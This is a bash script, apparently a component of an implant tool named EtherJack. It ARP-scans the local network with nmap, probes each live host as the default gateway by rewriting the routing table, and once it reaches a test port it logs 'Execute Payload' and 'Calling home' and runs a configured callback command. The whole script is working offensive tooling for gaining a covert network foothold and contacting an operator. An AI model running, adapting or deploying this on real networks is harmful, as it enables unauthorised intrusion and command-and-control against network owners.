#!/bin/bash
#
##################
# routefinder.sh
##################
#
source ../../EtherJack.conf

echo "############### ROUTEFINDER ###############" >>$EJLOG

MY_NET=$(cat my_net)
MY_IP=$(cat my_ip)
GTWY_IPS=gtwy_ips
MY_GTWY_IP=my_gtwy_ip
echo "Initiating nmap ARP scan on $MY_NET" >>$EJLOG
nmap -n -sn -PR --packet-trace --send-eth $MY_NET --exclude $MY_IP -oG nmaparp >/dev/null 2>&1
grep -i up nmaparp | awk '{print $2}' | grep -v Nmap | grep -v $MY_IP >$GTWY_IPS
DONE=NO
echo "ARP scan completed" >>$EJLOG
while [ "$DONE" == "NO" ]; do
	echo "Attempting to identify the gateway" >>$EJLOG
	for GTWY_IP in $(cat $GTWY_IPS); do
		echo "Testing $GTWY_IP as the gateway" >>$EJLOG
		route add default gw $GTWY_IP
		PortCheck=""
		PortCheck="$(nmap -n -sT -p $TESTPORT $TESTIP | grep -i open | awk '{print $2}')"
		if [ "$PortCheck" != "open" ]; then
			echo "Incorrect gateway...try again" >>$EJLOG
			ip route flush $GTWY_IP default
			DONE=NO
		else
			echo "Found gateway at $GTWY_IP" >>$EJLOG
			echo $GTWY_IP >$MY_GTWY_IP
			DONE=YES
			# Execute Payload
			echo "Network and route setup complete" >>$EJLOG
			echo "Calling home" >>$EJLOG
			echo "############### END ROUTEFINDER ###############" >>$EJLOG
			$CALLHOME
		fi
	done
done
